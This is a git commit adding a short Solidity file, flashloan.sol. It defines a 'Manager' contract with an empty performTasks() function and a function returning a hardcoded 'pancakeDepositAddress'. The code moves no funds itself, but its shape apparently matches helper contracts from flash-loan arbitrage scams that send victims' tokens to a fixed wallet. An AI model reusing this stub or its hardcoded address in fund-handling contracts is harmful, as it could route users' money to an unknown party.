80e2b4ee33e5cb8550e4a1511a93c345b5f8fc80
LoanRecArbi <86091953+LoanRecArbi@users.noreply.github.com>
2021-06-18 09:30:48 +0530

    Add files via upload

---
+++ flashloan.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+contract Manager {
+	function performTasks() public {
+
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+return 0xdD98EEDa819D4725404FD7CB072830402e7aA7cA;
+}
+
+}
